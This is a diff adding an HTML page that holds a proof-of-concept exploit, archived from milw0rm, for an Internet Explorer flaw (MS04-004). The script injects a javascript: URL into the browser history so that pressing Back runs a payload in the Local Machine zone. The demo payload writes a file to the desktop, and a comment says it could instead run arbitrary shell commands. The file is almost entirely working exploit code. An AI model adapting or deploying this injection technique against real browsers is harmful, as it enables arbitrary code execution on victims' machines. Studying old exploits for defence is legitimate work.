@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>MS Internet Explorer URL Injection in History List (MS04-004)
+</title>
+<pre>
+// Andreas Sandblad, 2004-02-03, patched by MS04-004
+
+// Name:     payload
+// Purpose:  Run payload code called from Local Machine zone.
+//           The code may be arbitrary such as executing shell commands.
+//           This demo simply creates a harmless textfile on the desktop.
+function payload() {
+  file = &quot;sandblad.txt&quot;;
+  o = new ActiveXObject(&quot;ADODB.Stream&quot;);
+  o.Open();
+  o.Type=2;
+  o.Charset=&quot;ascii&quot;;
+  o.WriteText(&quot;You are vulnerable!&quot;);
+  o.SaveToFile(file, 2);
+  o.Close();
+  alert(&quot;File &quot;+file+&quot; created on desktop!&quot;);
+}
+
+// Name:     trigger
+// Purpose:  Inject javascript url in history list and run payload
+//           function when the user hits the backbutton.
+function trigger(len) {
+  if (history.length != len)
+    payload();
+  else
+    return &quot;&lt;title&gt;-&lt;/title&gt;&lt;body
+onload=external.NavigateAndFind('res:','','')&gt;&quot;;
+}
+
+// Name:    backbutton
+// Purpose: Run backbutton exploit.
+function backbutton() {
+  location = 'javascript:'+trigger+payload+'trigger('+history.length+')';
+}
+
+// Launch backbutton exploit on load
+if (confirm(&quot;Press OK to run backbutton exploit!&quot;))
+  backbutton();
+
+
+# milw0rm.com [2004-02-04]
+</pre>
+</html>
+
